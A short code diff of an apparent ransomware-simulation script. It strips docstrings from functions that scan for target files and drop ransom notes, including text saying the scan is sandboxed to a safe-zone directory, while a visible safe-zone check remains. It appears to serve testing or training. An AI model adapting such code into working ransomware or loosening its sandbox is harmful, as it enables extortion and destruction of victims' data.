@@ -35,13 +35,10 @@ def load_key(path: Path) -> bytes:
 
 def scan_for_files(root: Path, allowed_ext: set = ALLOWED_EXT):
     """
-    Yields file paths under root with allowed extensions, ensuring the scan is
-    sandboxed within the SAFE_ZONE_NAME directory.
-
     Args:
         root (Path): The starting directory for the scan.
         allowed_ext (set): A set of lowercase file extensions to target.
-                           If None, all files are yielded.
+                        If None, all files are yielded.
     
     Raises:
         PermissionError: If the root path is outside the designated safe zone.
@@ -65,16 +62,6 @@ def scan_for_files(root: Path, allowed_ext: set = ALLOWED_EXT):
 
 
 def drop_ransom_notes(root: Path, ransom_note_content: str):
-    """
-    Drops a ransom note file in all directories traversed within the safe zone.
-
-    Args:
-        root (Path): The root directory of the simulation.
-        ransom_note_content (str): The content to be written to the ransom notes.
-
-    Raises:
-        PermissionError: If the root path is outside the designated safe zone.
-    """
     # CRITICAL SAFETY CHECK: Ensure the operation is within the safe zone.
     if not _verify_safety_path(root):
         raise PermissionError(f"Operation denied: The path '{root}' is outside the designated '{SAFE_ZONE_NAME}' directory.")
